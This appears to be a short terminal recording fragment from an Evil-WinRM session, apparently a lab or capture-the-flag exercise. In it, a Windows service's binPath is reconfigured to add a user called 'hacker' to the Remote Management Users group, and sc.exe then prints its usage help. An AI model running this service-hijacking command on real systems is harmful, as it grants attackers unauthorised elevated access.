[441.217054, "o", "\u001b[1A\u0001\u001b[0;31m\u0002*Evil-WinRM*\u0001\u001b[0m\u0002\u0001\u001b[0;1;33m\u0002 PS \u0001\u001b[0m\u0002C:\\Program FIles\\GuancheVMS> sc.exe config GuancheVMS binPath= \"cmd.exe /c net localgroup \\\"Remote Management Users\\\" hacker /add\"\r\r\nsc.exe start GuancheVMS\r\r\n"]
[441.217657, "o", "\u001b[1G"]
[441.221123, "o", "\u001b[?2004l"]
[441.814824, "o", "DESCRIPTION:\r\n"]
[441.816216, "o", "        Modifies a service entry in the registry and Service Database.\r\n"]
[441.820818, "o", "USAGE:\r\n"]
[441.829855, "o", "        sc <server> config [service name] <option1> <option2>...\r\n\r\n"]
[441.831486, "o", "OPTIONS:\r\n"]
[441.837166, "o", "NOTE: The option name includes the equal sign.\r\n"]
[441.838776, "o", "      A space is required between the equal sign and the value.\r\n"]
[441.840022, "o", "      To remove the dependency, use a single / as dependency value.\r\n"]
[441.846588, "o", " type= <own|share|interact|kernel|filesys|rec|adapt|userown|usershare>\r\n"]
